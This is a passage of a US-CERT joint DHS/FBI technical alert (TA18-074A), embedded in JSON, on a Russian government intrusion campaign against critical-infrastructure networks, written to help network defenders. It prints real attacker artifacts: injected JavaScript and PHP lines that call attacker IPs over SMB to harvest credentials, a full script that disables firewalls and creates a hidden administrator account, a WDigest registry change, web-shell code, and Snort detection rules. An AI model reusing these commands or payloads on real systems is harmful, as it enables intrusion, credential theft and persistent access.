2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.kb.cert.org/vuls/id/672268\">[2] CERT CC. Vulnerability Note #672268</a></li>\n            \t\t    \t<li><a href=\"\">[3] CCIRC CF17-010 UPDATE</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[4] MIFR-10127623</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>March 15, 2018: Initial Version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10681 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA18-074A",
					"source_name": "open source",
					"description": "Original release date: March 15, 2018 | Last revised: March 16, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <ul><li>Domain Controllers</li><li>File Servers</li><li>Email Servers</li></ul>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on Russian government actions targeting U.S. Government entities as well as organizations in the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors. It also contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by Russian government cyber actors on compromised victim networks. DHS and FBI produced this alert to educate network defenders to enhance their ability to identify and reduce exposure to malicious activity.</p><p>DHS and FBI characterize this activity as a multi-stage intrusion campaign by Russian government cyber actors who targeted small commercial facilities’ networks where they staged malware, conducted spear phishing, and gained remote access into energy sector networks. After obtaining access, the Russian government cyber actors conducted network reconnaissance, moved laterally, and collected information pertaining to Industrial Control Systems (ICS).</p><p>For a downloadable copy of IOC packages and associated files, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA18-074A_WHITE.csv\">TA18-074A_TLP_WHITE.csv</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA18-074A_WHITE_STIX.xml\">TA18-074A_TLP_WHITE.stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">MIFR-10127623_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml\">MIFR-10127623_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf\">MIFR-10128327_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml\">MIFR-10128327_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf\">MIFR-10128336_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml\">MIFR-10128336_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf\">MIFR-10128830­_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml\">MIFR-10128830­_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf\">MIFR-10128883_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml\">MIFR-10128883_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf\">MIFR-10135300_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml\">MIFR-10135300_TLP_WHITE_stix.xml</a></li></ul><p>Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since at least March 2016, Russian government cyber actors—hereafter referred to as “threat actors”—targeted government entities and multiple U.S. critical infrastructure sectors, including the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors.</p><p>Analysis by DHS and FBI, resulted in the identification of distinct indicators and behaviors related to this activity. Of note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[1]</a></p><p>This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third-party suppliers with less secure networks, referred to as “staging targets” throughout this alert. The threat actors used the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. NCCIC and FBI judge the ultimate objective of the actors is to compromise organizational networks, also referred to as the “intended target.”</p><p><strong>Technical Details</strong></p><p>The threat actors in this campaign employed a variety of TTPs, including</p><ul><li>spear-phishing emails (from compromised legitimate account),</li><li>watering-hole domains,</li><li>credential gathering,</li><li>open-source and network reconnaissance,</li><li>host-based exploitation, and</li><li>targeting industrial control system (ICS) infrastructure.</li></ul><p><strong>Using Cyber Kill Chain for Analysis</strong></p><p>DHS used the Lockheed-Martin Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of threat actors’ activities within this framework.</p><p> </p><p><strong>Stage 1: Reconnaissance</strong></p><p>The threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. DHS analysis identified the threat actors accessing publicly available information hosted by organization-monitored networks during the reconnaissance phase. Based on forensic analysis, DHS assesses the threat actors sought information on network and organizational design and control system capabilities within organizations. These tactics are commonly used to collect the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publicly accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.</p><p>Analysis also revealed that the threat actors used compromised staging targets to download the source code for several intended targets’ websites. Additionally, the threat actors attempted to remotely access infrastructure such as corporate web-based email and virtual private network (VPN) connections.</p><p> </p><p><strong>S<strong>tage 2: Weaponization</strong></strong></p><p><strong>Spear-Phishing Email TTPs </strong></p><p>Throughout the spear-phishing campaign, the threat actors used email attachments to leverage legitimate Microsoft Office functions for retrieving a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//&lt;remote IP address&gt;/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server before retrieving the requested file. (Note: transfer of credentials can occur even if the file is not retrieved.) After obtaining a credential hash, the threat actors can use password-cracking techniques to obtain the plaintext password. With valid credentials, the threat actors are able to masquerade as authorized users in environments that use single-factor authentication. <a href=\"https://www.kb.cert.org/vuls/id/672268\">[2]</a></p><p> </p><p><strong>Use of Watering Hole Domains </strong></p><p>One of the threat actors’ primary uses for staging targets was to develop watering holes. Threat actors compromised the infrastructure of trusted organizations to reach intended targets. [3] Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure. Although these watering holes may host legitimate content developed by reputable organizations, the threat actors altered websites to contain and reference malicious content. The threat actors used legitimate credentials to access and directly modify the website content. The threat actors modified these websites by altering JavaScript and PHP files to request a file icon using SMB from an IP address controlled by the threat actors. This request accomplishes a similar technique observed in the spear-phishing documents for credential harvesting. In one instance, the threat actors added a line of code into the file “header.php”, a legitimate PHP file that carried out the redirected traffic.</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>&lt;img src=\"https://www.us-cert.govfile[:]//62.8.193[.]206/main_logo.png\" style=\"height: 1px; width: 1px;\" /&gt;</p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p>In another instance, the threat actors modified the JavaScript file, “modernizr.js”, a legitimate JavaScript library used by the website to detect various aspects of the user’s browser. The file was modified to contain the contents below:</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>var i = document.createElement(\"img\");</p><p>i.src = \"file[:]//184.154.150[.]66/ame_icon.png\";</p><p>i.width = 3;</p><p>i.height=2;</p></td></tr></tbody></table><div style=\"clear: both;\"> </div><div style=\"clear: both;\"> </div></div><p><strong>Stage 3: Delivery </strong></p><p>When compromising staging target networks, the threat actors used spear-phishing emails that differed from previously reported TTPs. The spear-phishing emails used a generic contract agreement theme (with the subject line “AGREEMENT &amp; Confidential”) and contained a generic PDF document titled ``document.pdf. (Note the inclusion of two single back ticks at the beginning of the attachment name.) The PDF was not malicious and did not contain any active code. The document contained a shortened URL that, when clicked, led users to a website that prompted the user for email address and password. (Note: no code within the PDF initiated a download.)</p><p>In previous reporting, DHS and FBI noted that all of these spear-phishing emails referred to control systems or process control systems. The threat actors continued using these themes specifically against intended target organizations. Email messages included references to common industrial control equipment and protocols. The emails used malicious Microsoft Word attachments that appeared to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, and invitations and policy documents to entice the user to open the attachment.</p><p> </p><p><strong>Stage 4: Exploitation </strong></p><p>The threat actors used distinct and unusual TTPs in the phishing campaign directed at staging targets. Emails contained successive redirects to http://bit[.]ly/2m0x8IH link, which redirected to http://tinyurl[.]com/h3sdqck link, which redirected to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained input fields for an email address and password mimicking a login page for a website.</p><p>When exploiting the intended targets, the threat actors used malicious .docx files to capture user credentials. The documents retrieved a file through a “file://” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139. This connection is made to a command and control (C2) server—either a server owned by the threat actors or that of a victim. When a user attempted to authenticate to the domain, the C2 server was provided with the hash of the password. Local users received a graphical user interface (GUI) prompt to enter a username and password, and the C2 received this information over TCP ports 445 or 139. (Note: a file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[1]</a></p><p> </p><p><strong>Stage 5: Installation </strong></p><p>The threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication was not used. <a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[4]</a> To maintain persistence, the threat actors created local administrator accounts within staging targets and placed malicious files within intended targets.</p><p> </p><p><strong>Establishing Local Accounts </strong></p><p>The threat actors used scripts to create local administrator accounts disguised as legitimate backup accounts. The initial script “symantec_help.jsp” contained a one-line reference to a malicious script designed to create the local administrator account and manipulate the firewall for remote access. The script was located in “C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\”.</p><p> </p><p><strong>Contents of symantec_help.jsp </strong></p><p>____________________________________________________________________________________________________________________</p><p>&lt;% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\&lt;enu.cmd&gt;\\\"\"); %&gt;</p><p>____________________________________________________________________________________________________________________</p><p>The script “enu.cmd” created an administrator account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group to gain elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.</p><p> </p><p><strong>Contents of enu.cmd </strong></p><p>____________________________________________________________________________________________________________________</p><p>netsh firewall set opmode disable</p><p>netsh advfirewall set allprofiles state off</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f</p><p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f</p><p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f</p><p>reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v MaxInstanceCount /t REG_DWORD /d 100 /f</p><p>net user MS_BACKUP &lt;Redacted_Password&gt; /add</p><p>net localgroup Administrators /add MS_BACKUP</p><p>net localgroup Administradores /add MS_BACKUP</p><p>net localgroup Amministratori /add MS_BACKUP</p><p>net localgroup Administratoren /add MS_BACKUP</p><p>net localgroup Administrateurs /add MS_BACKUP</p><p>net localgroup \"Remote Desktop Users\" /add MS_BACKUP</p><p>net user MS_BACKUP /expires:never</p><p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v MS_BACKUP /t REG_DWORD /d 0 /f</p><p>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</p><p>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p><p>sc config termservice start= auto</p><p>net start termservice</p><p>____________________________________________________________________________________________________________________</p><p>DHS observed the threat actors using this and similar scripts to create multiple accounts within staging target networks. Each account created by the threat actors served a specific purpose in their operation. These purposes ranged from the creation of additional accounts to cleanup of activity. DHS and FBI observed the following actions taken after the creation of these local accounts:</p><p><strong>Account 1</strong>: Account 1 was named to mimic backup services of the staging target. This account was created by the malicious script described earlier. The threat actor used this account to conduct open-source reconnaissance and remotely access intended targets.</p><p><strong>Account 2</strong>: Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.</p><p><strong>Account 3</strong>: Account 3 was created within the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).</p><p><strong>Account 4</strong>: In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete logs and cover tracks.</p><p> </p><p><strong>Scheduled Task</strong></p><p>In addition, the threat actors created a scheduled task named <em>reset</em>, which was designed to automatically log out of their newly created account every eight hours.</p><p> </p><p><strong>VPN Software</strong></p><p>After achieving access to staging targets, the threat actors installed tools to carry out operations against intended victims. On one occasion, threat actors installed the free version of FortiClient, which they presumably used as a VPN client to connect to intended target networks.</p><p> </p><p><strong>Password Cracking Tools</strong></p><p>Consistent with the perceived goal of credential harvesting, the threat actors dropped and executed open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the actor was accessing the system. Of note, the threat actors installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\&lt;Redacted Username&gt;\\Desktop\\OWAExchange\\.</p><p> </p><p><strong>Downloader </strong></p><p>Once inside of an intended target’s network, the threat actor downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.</p><p>In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:</p><ul><li>The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.</li><li>The files were renamed to new extensions, with INST.txt being renamed INST.exe.</li><li>The files were executed on the host and then immediately deleted.</li><li>The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of the compromised system of an intended target.</li><li>The registry value “ntdll” was added to the “HKEY_USERS\\&lt;USER SID&gt;\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” key.</li></ul><p> </p><p><strong>Persistence Through .LNK File Manipulation</strong></p><p>The threat actors manipulated LNK files, commonly known as a Microsoft Window’s shortcut file, to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local or remote Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to a remote server controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection.</p><p>Four of the observed LNK files were “SETROUTE.lnk”, “notepad.exe.lnk”, “Document.lnk” and “desktop.ini.lnk”. These names appeared to be contextual, and the threat actor may use a variety of other file names while using this tactic. Two of the remote servers observed in the icon path of these LNK files were 62.8.193[.]206 and 5.153.58[.]45. Below is the parsed content of one of the LNK files:</p><p><img alt=\"Parsed content of one of the LNK files\" src=\"https://www.us-cert.gov/sites/default/files/publications/parsed_content_LNK_file.png\" style=\"width: 697px; height: 274px;\" /></p><p>Parsed output for file: desktop.ini.lnk</p><p><strong>Registry Modification </strong></p><p>The threat actor would modify key systems to store plaintext credentials in memory. In one instance, the threat actor executed the following command.</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f</p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p><strong>Stage 6: Command and Control</strong></p><p>The threat actors commonly created web shells on the intended targets’ publicly accessible email and web servers. The threat actors used three different filenames (“global.aspx, autodiscover.aspx and index.aspx) for two different webshells. The difference between the two groups was the “public string Password” field.</p><p> </p><p><strong>Beginning Contents of the Web Shell </strong></p><p>____________________________________________________________________________________________________________________</p><p>&lt;%@ Page Language=\"C#\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" EnableViewStateMac=\"false\" EnableViewState=\"true\"%&gt;</p><p>&lt;%@ import Namespace=\"System\"%&gt;</p><p>&lt;%@ import Namespace=\"System.IO\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Diagnostics\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Data\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Management\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Data.OleDb\"%&gt;</p><p>&lt;%@ import Namespace=\"Microsoft.Win32\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Net.Sockets\" %&gt;</p><p>&lt;%@ import Namespace=\"System.Net\" %&gt;</p><p>&lt;%@ import Namespace=\"System.Runtime.InteropServices\"%&gt;</p><p>&lt;%@ import Namespace=\"System.DirectoryServices\"%&gt;</p><p>&lt;%@ import Namespace=\"System.ServiceProcess\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Text.RegularExpressions\"%&gt;</p><p>&lt;%@ Import Namespace=\"System.Threading\"%&gt;</p><p>&lt;%@ Import Namespace=\"System.Data.SqlClient\"%&gt;</p><p>&lt;%@ import Namespace=\"Microsoft.VisualBasic\"%&gt;</p><p>&lt;%@ Import Namespace=\"System.IO.Compression\" %&gt;</p><p>&lt;%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%&gt;</p><p>&lt;%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%&gt;</p><p>&lt;%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%&gt;</p><p>&lt;%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%&gt;</p><p>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;</p><p>&lt;script runat = \"server\"&gt;</p><p>public string Password = \"&lt;REDACTED&gt;\";</p><p>public string z_progname = \"z_WebShell\";</p><p>…</p><p><strong>____________________________________________________________________________________________________________________</strong></p><p> </p><p><strong>Stage 7: Actions on Objectives </strong></p><p>DHS and FBI identified the threat actors leveraging remote access services and infrastructure such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used the infrastructure of staging targets to connect to several intended targets.</p><p> </p><p><strong>Internal Reconnaissance </strong></p><p>Upon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. DHS observed the threat actors focusing on identifying and browsing file servers within the intended victim’s network.</p><p>Once on the intended target’s network, the threat actors used privileged credentials to access the victim’s domain controller typically via RDP. Once on the domain controller, the threat actors used the batch scripts “dc.bat” and “dit.bat” to enumerate hosts, users, and additional information about the environment. The observed outputs (text documents) from these scripts were:</p><ul><li>admins.txt</li><li>completed_dclist.txt</li><li>completed_trusts.txt</li><li>completed_zone.txt</li><li>comps.txt</li><li>conditional_forwarders.txt</li><li>domain_zone.txt</li><li>enum_zones.txt</li><li>users.txt</li></ul><p>The threat actors also collected the files “ntds.dit” and the “SYSTEM” registry hive. DHS observed the threat actors compress all of these files into archives named “SYSTEM.zip” and “comps.zip”.</p><p>The threat actors used Windows’ scheduled task and batch scripts to execute “scr.exe” and collect additional information from hosts on the network. The tool “scr.exe” is a screenshot utility that the threat actor used to capture the screen of systems across the network. The MD5 hash of “scr.exe” matched the MD5 of ScreenUtil, as reported in the Symantec Dragonfly 2.0 report.</p><p>In at least two instances, the threat actors used batch scripts labeled “pss.bat” and “psc.bat” to run the PsExec tool. Additionally, the threat actors would rename the tool PsExec to “ps.exe”.</p><ol><li>The batch script (“pss.bat” or “psc.bat”) is executed with domain administrator credentials.</li><li>The directory “out” is created in the user’s %AppData% folder.</li><li>PsExec is used to execute “scr.exe” across the network and to collect screenshots of systems in “ip.txt”.</li><li>The screenshot’s filename is labeled based on the computer name of the host and stored in the target’s C:\\Windows\\Temp directory with a “.jpg” extension.</li><li>The screenshot is then copied over to the newly created “out” directory of the system where the batch script was executed.</li><li>In one instance, DHS observed an “out.zip” file created.</li></ol><p>DHS observed the threat actors create and modify a text document labeled “ip.txt” which is believed to have contained a list of host information. The threat actors used “ip.txt” as a source of hosts to perform additional reconnaissance efforts. In addition, the text documents “res.txt” and “err.txt” were observed being created as a result of the batch scripts being executed. In one instance, “res.txt” contained output from the Windows’ command “query user” across the network.</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>Using &lt;Username&gt; &lt;Password&gt;<br />Running -s cmd /c query user on &lt;Hostname1&gt;<br />Running -s cmd /c query user on &lt;Hostname2&gt;<br />Running -s cmd /c query user on &lt;Hostname3&gt;<br />USERNAME     SESSIONNAME       ID    STATE    IDLE TIME      LOGON TIME<br />&lt;user1&gt;                                              2       Disc       1+19:34         6/27/2017 12:35 PM</p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p>An additional batch script named “dirsb.bat” was used to gather folder and file names from hosts on the network.</p><p>In addition to the batch scripts, the threat actors also used scheduled tasks to collect screenshots with “scr.exe”. In two instances, the scheduled tasks were designed to run the command “C:\\Windows\\Temp\\scr.exe” with the argument “C:\\Windows\\Temp\\scr.jpg”. In another instance, the scheduled task was designed to run with the argument “pss.bat” from the local administrator’s “AppData\\Local\\Microsoft\\” folder.</p><p>The threat actors commonly executed files out of various directories within the user’s AppData or Downloads folder. Some common directory names were</p><ul><li>Chromex64,</li><li>Microsoft_Corporation,</li><li>NT,</li><li>Office365,</li><li>Temp, and</li><li>Update.</li></ul><p> </p><p><strong>Targeting of ICS and SCADA Infrastructure</strong></p><p>In multiple instances, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).</p><p>The threat actors targeted and copied profile and configuration information for accessing ICS systems on the network. DHS observed the threat actors copying Virtual Network Connection (VNC) profiles that contained configuration information on accessing ICS systems. DHS was able to reconstruct screenshot fragments of a Human Machine Interface (HMI) that the threat actors accessed.</p><p><img alt=\"This image depicts a reconstructed screenshot of a Human Machine Interface (HMI) system that was accessed by the threat actor. This image demonstrates the threat actor's focus and interest in Industrial Control System (ICS) environments.\" src=\"https://www.us-cert.gov/sites/default/files/publications/JTA-graphic.jpg\" style=\"width: 900px; height: 757px;\" /></p><p> </p><p><strong>Cleanup and Cover Tracks </strong></p><p>In multiple instances, the threat actors created new accounts on the staging targets to perform cleanup operations. The accounts created were used to clear the following Windows event logs: System, Security, Terminal Services, Remote Services, and Audit. The threat actors also removed applications they installed while they were in the network along with any logs produced. For example, the Fortinet client installed at one commercial facility was deleted along with the logs that were produced from its use. Finally, data generated by other accounts used on the systems accessed were deleted.</p><p>Threat actors cleaned up intended target networks through deleting created screenshots and specific registry keys. Through forensic analysis, DHS determined that the threat actors deleted the registry key associated with terminal server client that tracks connections made to remote systems. The threat actors also deleted all batch scripts, output text documents and any tools they brought into the environment such as “scr.exe”.</p><p> </p><p><strong>Detection and Response</strong></p><p>IOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlists to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these threat actors.</p><p> </p><p><strong>Network Signatures and Host-Based Rules</strong></p><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actor TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.</p><p> </p><p><strong>Network Signatures</strong></p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</p><p>___________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</p><p>________________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)</p><p>_________________________________________</p><p>alert tcp any any -&gt; any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)</p><p>________________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service http;)</p><p>_________________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1; flow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]{3}=[a-z0-9]{32}&amp;/U\"; classtype:bad-unknown; metadata:service http;)</p><p>__________________________________________</p><p>alert tcp $EXTERNAL_NET [139,445] -&gt; $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1; flow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; 